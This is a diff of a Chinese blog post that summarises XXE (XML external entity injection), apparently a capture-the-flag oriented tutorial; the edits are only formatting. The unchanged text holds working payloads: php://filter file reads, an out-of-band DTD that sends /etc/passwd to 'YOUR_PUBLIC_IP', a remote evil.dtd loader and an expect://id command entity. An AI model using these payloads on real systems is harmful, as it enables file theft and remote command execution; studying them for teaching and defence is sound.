@@ -4,11 +4,11 @@ description: "XXE 漏洞总结，记录外部实体注入的原理、利用场�
 pubDate: "2026-01-21"
 updatedDate: "2026-01-21"
 tags: ["XXE", "漏洞总结", "Web安全"]
-cover: auto
+cover: "ef08a8a358a5f9cf5caa817ec3c1702872233788_raw..jpg"
 coverAlt: "XXE 的文章封面"
 draft: false
 ---
-# XXE
+## XXE
 
 ## 什么是XXE
 XML 外部实体注入（XML External Entity Injection）漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载外部文件，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 DoS 攻击等危害。
@@ -28,7 +28,7 @@ XML 指可扩展标记语言（eXtensible Markup Language）。
 接下来简单讲一下xml的语法：
 
 ### 首先，一个XML必须有根元素，可以有一个声明，如下
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>(声明)
 <note>(根元素)
   <to>Tove</to>
@@ -37,7 +37,7 @@ XML 指可扩展标记语言（eXtensible Markup Language）。
   <body>Don't forget me this weekend!</body>
 </note>
 ```
-### 其次，对于xml来说，其中的标签是可以由使用者自由定义的，如<to>,<from>,<body>,<xxe>等，在标签定义上是极为自由的，但是一般对于一道试题来说我们的标签不能随意定义，需要利用回显点实现目的。
+### 其次，对于xml来说，其中的标签是可以由使用者自由定义的，如 `<to>`、`<from>`、`<body>`、`<xxe>` 等，在标签定义上是极为自由的，但是一般对于一道试题来说我们的标签不能随意定义，需要利用回显点实现目的。
 
 ### 最后，讲一下dtd：
 
@@ -48,13 +48,13 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
 #### 内部的 DOCTYPE 声明
 
 假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：
-```
+```xml
 <!DOCTYPE root-element [element-declarations]> 
 ```
 #### 外部文档声明
 
 假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：
-```
+```xml
 <!DOCTYPE root-element SYSTEM "filename"> 
 ```
 在XXE中对DTD的使用主要就是外部实体的引入，以下简单介绍一下实体：
@@ -67,39 +67,39 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
 
 #### 一个内部实体声明
 语法
-```
+```xml
 <!ENTITY entity-name "entity-value">
 ```
 实例
 DTD 实例:
-```
+```xml
 <!ENTITY writer "Donald Duck.">
 <!ENTITY copyright "Copyright runoob.com">
 ```
 XML 实例：
-```
+```xml
 <author>&writer;&copyright;</author>
 ```
 注意： 一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。
 
 #### 一个外部实体声明
 语法
-```
+```xml
 <!ENTITY entity-name SYSTEM "URI/URL">
 ```
 实例
 DTD 实例:
-```
+```xml
 <!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd">
 <!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd">
 ```
 XML example:
-```
+```xml
 <author>&writer;&copyright;</author> 
 ```
 ## 如何实现xxe
 对于一个可以传xml的场景来说，一般便可以考虑使用xxe，一个常见的xxe格式为：
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE ANY [
     <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=login.php">
@@ -109,7 +109,7 @@ XML example:
 </root>
 ```
 对于system被过滤的情况可以尝试：
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE note [
 <!ENTITY abc PUBLIC "123" "php://filter/convert.base64-encode/resource=tip.php">
@@ -148,14 +148,14 @@ XML example:
 
 ### 无回显
 对于外带数据通常要去在自己的公网服务器写一个dtd并挂载让场景去引用，如下
-```
+```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd"> <!-- 或者是题目指定的flag文件路径 -->
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_PUBLIC_IP:8000/?content=%file;'>">
 %eval;
 %exfiltrate;
 ```
 先在公网服务器，托管一个恶意dtd，此处利用二次解析绕过，xml中参数实体的限制，当%eval;时，exfiltrate被解析注入当前dtd环境，&#x25;变为%，&#x25;是字符 % 的HTML/XML实体编码，在第一次起到延迟执行的作用。
-```
+```xml
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ENTITY % remote SYSTEM "http://YOUR_PUBLIC_IP:8000/evil.dtd">
@@ -184,7 +184,7 @@ XML example:
         作用域: 只能在DTD（文档类型定义）内部使用。也就是在 <!DOCTYPE ... [ ... %entity_name; ... ]> 这个方括号里面。
 
 如果环境存在expect扩展，也可以使用
-```
+```xml
 <?xml version="1.0" ?>
 <!DOCTYPE ANY [
     <!ENTITY xxe SYSTEM "expect://id">
